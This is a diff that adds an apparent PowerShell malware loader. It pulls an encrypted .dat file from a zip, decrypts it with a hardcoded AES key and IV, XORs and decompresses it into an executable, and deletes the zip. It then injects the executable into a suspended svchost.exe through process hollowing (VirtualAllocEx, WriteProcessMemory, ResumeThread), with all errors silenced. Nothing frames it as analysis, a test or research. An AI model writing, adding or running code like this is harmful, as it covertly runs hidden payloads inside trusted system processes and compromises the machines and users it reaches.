@@ -1,0 +1,55 @@
+$ErrorActionPreference='SilentlyContinue'
+$zip=$env:tmpzip
+[void][System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression')
+[void][System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')
+$za=[System.IO.Compression.ZipFile]::OpenRead($zip)
+$entry=$za.Entries|Where-Object{$_.Name-like'*.dat'}|Select-Object -First 1
+$es=$entry.Open()
+$enc=New-Object byte[] $entry.Length
+[void]$es.Read($enc,0,$enc.Length)
+$es.Close()
+$za.Dispose()
+Remove-Item $zip -Force -EA SilentlyContinue
+$k=[byte[]](0x26,0x4B,0x21,0xA7,0x2B,0xEE,0x64,0x0C,0x87,0xB2,0xDD,0x98,0xCD,0xD4,0x02,0xAC,0x7A,0xE5,0x37,0xCF,0x39,0xD5,0xD7,0x26,0x3F,0xFA,0xEE,0x62,0xBD,0xCE,0x06,0xE9)
+$iv=[byte[]](0x43,0x30,0x6C,0xD4,0x84,0xA8,0x60,0xAB,0xF2,0x5A,0xA5,0x0E,0xC4,0x89,0x1A,0xAC)
+$aes=[Security.Cryptography.Aes]::Create()
+$aes.Key=$k
+$aes.IV=$iv
+$aes.Padding='PKCS7'
+$dec=$aes.CreateDecryptor()
+$ds=New-Object System.IO.MemoryStream
+$cs=New-Object Security.Cryptography.CryptoStream($ds,$dec,'Write')
+$cs.Write($enc,0,$enc.Length)
+$cs.Close()
+$d=$ds.ToArray()
+$ds.Close()
+for($i=0;$i-lt$d.Length;$i++){$d[$i]=$d[$i]-bxor0x42}
+$gs=New-Object System.IO.MemoryStream(,$d)
+$gz=New-Object System.IO.Compression.GZipStream($gs,[System.IO.Compression.CompressionMode]::Decompress)
+$os=New-Object System.IO.MemoryStream
+$gz.CopyTo($os)
+$pe=$os.ToArray()
+$gz.Close()
+$gs.Close()
+$os.Close()
+$c=@"
+using System;using System.Runtime.InteropServices;
+public class W{[StructLayout(LayoutKind.Sequential)]public struct SI{public uint cb;public IntPtr r;public IntPtr d;public IntPtr t;public uint x;public uint y;public uint xs;public uint ys;public uint xc;public uint yc;public uint f;public uint fl;public ushort s;public ushort c;public IntPtr r2;public IntPtr i;public IntPtr o;public IntPtr e;}[StructLayout(LayoutKind.Sequential)]public struct PI{public IntPtr hp;public IntPtr ht;public uint pi;public uint ti;}[StructLayout(LayoutKind.Sequential)]public struct PBI{public IntPtr r1;public IntPtr PebAddress;public IntPtr r2;public IntPtr r3;public IntPtr UniqueProcessId;public IntPtr r4;}[DllImport("kernel32")]public static extern bool CreateProcess(string a,string c,IntPtr pa,IntPtr ta,bool i,uint f,IntPtr en,string d,ref SI si,out PI pi);[DllImport("ntdll")]public static extern uint ZwQueryInformationProcess(IntPtr h,int c,ref PBI i,uint l,out uint rl);[DllImport("kernel32")]public static extern bool ReadProcessMemory(IntPtr h,IntPtr a,byte[] b,int s,out int r);[DllImport("kernel32")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint s,out int w);[DllImport("kernel32")]public static extern uint ResumeThread(IntPtr h);}
+"@
+Add-Type $c
+$si=New-Object W+SI
+$si.cb=[Runtime.InteropServices.Marshal]::SizeOf($si)
+$pi=New-Object W+PI
+[W]::CreateProcess("C:\Windows\System32\svchost.exe",$null,[IntPtr]::Zero,[IntPtr]::Zero,$false,4,[IntPtr]::Zero,$null,[ref]$si,[ref]$pi)|Out-Null
+$pbi=New-Object W+PBI
+$rl=0
+[W]::ZwQueryInformationProcess($pi.hp,0,[ref]$pbi,[Runtime.InteropServices.Marshal]::SizeOf($pbi),[ref]$rl)|Out-Null
+$ib=New-Object byte[] 8
+[W]::ReadProcessMemory($pi.hp,[IntPtr]($pbi.PebAddress.ToInt64()+16),$ib,8,[ref]$rl)|Out-Null
+$base=[BitConverter]::ToInt64($ib,0)
+$ih=[BitConverter]::ToInt32($pe,60)
+$is=[BitConverter]::ToInt32($pe,$ih+80)
+$a=[W]::VirtualAllocEx($pi.hp,[IntPtr]$base,[uint32]$is,12288,64)
+$w=0
+[W]::WriteProcessMemory($pi.hp,$a,$pe,[uint32]$pe.Length,[ref]$w)|Out-Null
+[W]::ResumeThread($pi.ht)|Out-Null
